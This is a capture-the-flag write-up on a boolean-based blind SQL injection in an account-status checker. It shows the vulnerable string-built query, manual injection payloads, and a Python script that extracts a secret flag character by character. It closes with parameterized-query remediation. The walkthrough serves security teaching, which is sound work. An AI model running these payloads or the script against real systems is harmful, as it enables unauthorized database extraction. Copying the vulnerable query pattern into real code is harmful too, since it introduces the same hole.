# Challenge 10 — Balance Check (Blind SQL Injection — Boolean-Based)

## Hook

Even silence can answer a question if you ask carefully. In this challenge, the server only says "Active" or "Inactive" — but with Blind SQL Injection, those two words are enough to extract an entire database one character at a time.

---

## Challenge Overview

### Description

A public account status checker returns only whether an account is "Active" or "Inactive". The flag is stored in the `secrets` table. The account number field is vulnerable to SQL injection.

### Goal

Extract the flag from the `secrets` table character-by-character using boolean-based blind SQL injection.

### Hint Analysis

> "Even silence can answer a question if you ask carefully."

The hint indicates that the application leaks information indirectly through binary responses (Active/Inactive) — a classic blind SQL injection scenario.

---

## Vulnerability Identification

- **Vulnerability Class:** Blind SQL Injection (Boolean-Based)
- **Why It Exists:** The `account_number` parameter is interpolated directly into a SQL query string. The application returns different content based on whether the query returns a row with `status='Active'`.
- **Typical Real-World Impact:** Data exfiltration over low-bandwidth inference channels, database enumeration.

The vulnerable code in `main.py`:

```python
sql = f"SELECT status FROM accounts WHERE account_number='{acc_num}'"
row = get_db().execute(sql).fetchone()
status = 'Active' if (row and row[0] == 'Active') else 'Inactive'
```

The `secrets` table contains the flag:

```python
db.execute("INSERT OR IGNORE INTO secrets VALUES (1,?)", (flag('blind'),))
```

---

## Recon and Testing

### Request Analysis

`POST /account/status` with `account_number=<value>`.

### Response Analysis

- `ACC-1042` → "Active" (exists, status is Active)
- `ACC-2090` → "Inactive" (exists, status is Inactive)
- `ACC-9999` → "Inactive" (does not exist)

### Behavioral Differences

- `ACC-1042' AND 1=1 --` → "Active" (injection works, condition true)
- `ACC-1042' AND 1=2 --` → "Inactive" (condition false)

This confirms boolean-based blind SQL injection.

---

## Exploitation

### Strategy

Use the `Active`/`Inactive` binary response to infer information character-by-character from the `secrets` table.

### Confirm Table Existence

```
ACC-1042' AND (SELECT COUNT(*) FROM secrets)=1 --
```

Returns "Active" → the `secrets` table exists with 1 row.

### Extract Flag Length

```
ACC-1042' AND (SELECT LENGTH(flag) FROM secrets)=20 --
```

Adjust `=20` until it returns "Active". (The flag format is `FLAG{blind_XXXXXXXX}` — adjust expected length.)

### Extract Characters

Use `SUBSTR()` to extract one character at a time, comparing ASCII values:

```
ACC-1042' AND (SELECT ASCII(SUBSTR(flag,1,1)) FROM secrets)=70 --
```

`ASCII('F') = 70` → returns "Active" means the first character is `F`.

For automated extraction, use a script that iterates through positions and characters.

### Automation Script (Python)

```python
import requests
import string

url = "http://localhost:3000/account/status"
flag = ""
charset = string.ascii_uppercase + string.digits + "{}_"

for pos in range(1, 50):
    found = False
    for ch in charset:
        # Using string comparison instead of ASCII for simplicity
        payload = f"ACC-1042' AND (SELECT SUBSTR(flag,{pos},1) FROM secrets)='{ch}' --"
        r = requests.post(url, data={"account_number": payload})
        if "Active" in r.text:
            flag += ch
            print(f"Position {pos}: {ch} → Current flag: {flag}")
            found = True
            break
    if not found:
        print(f"Position {pos}: No match found — end of flag?")
        break
```

### Manual Payload Examples

**Check first character:**
```
ACC-1042' AND (SELECT SUBSTR(flag,1,1) FROM secrets)='F' --
```

**Check second character:**
```
ACC-1042' AND (SELECT SUBSTR(flag,2,1) FROM secrets)='L' --
```

**Check flag prefix (substring):**
```
ACC-1042' AND (SELECT SUBSTR(flag,1,5) FROM secrets)='FLAG{' --
```

### Why It Works

- The injected SQL is part of a `WHERE` clause: `SELECT status FROM accounts WHERE account_number='ACC-1042' AND (condition) --`
- If the `AND (condition)` evaluates to `True`, the original account row is returned, and the page shows "Active".
- If the condition is `False`, the query returns no rows (or a different row), and the page shows "Inactive".
- By crafting conditions like `SUBSTR(flag,N,1)='X'`, we learn the Nth character of the flag through binary inference.

### Expected Result

Each payload returns "Active" (correct character) or "Inactive" (wrong character). By iterating through positions and characters, the complete flag is recovered.

---

## Flag Retrieval

The flag format is `FLAG{blind_<8-char-hex>}`. Example recovered output:

```
FLAG{blind_a1b2c3d4}
```

Run the automation script or manually test character by character to extract the full flag.

---

## Root Cause

The developer concatenated user input directly into the SQL query string instead of using parameterized queries:

```python
sql = f"SELECT status FROM accounts WHERE account_number='{acc_num}'"
```

The result is a boolean-based blind SQL injection that allows data extraction from other database tables.

---

## Remediation

Use parameterized queries:

```python
sql = "SELECT status FROM accounts WHERE account_number=?"
row = qry(sql, (acc_num,), one=True)
```

Additional measures:
- Disable detailed database error messages in production (though this endpoint catches exceptions, proper parameterization is the real fix).
- Limit database connection privileges — the application user should not have access to `secrets` table.
- Implement rate limiting on the status endpoint to slow automated extraction attempts.

---

## Key Takeaways

- **Vulnerability:** Blind SQL Injection (Boolean-Based) via string concatenation.
- **Exploitation Path:** Inject conditional SQL expressions; the "Active"/"Inactive" binary response reveals whether each condition is true.
- **Security Lesson:** Parameterized queries prevent SQL injection completely — even blind extraction. Binary responses do not prevent data exfiltration; they only slow it down.
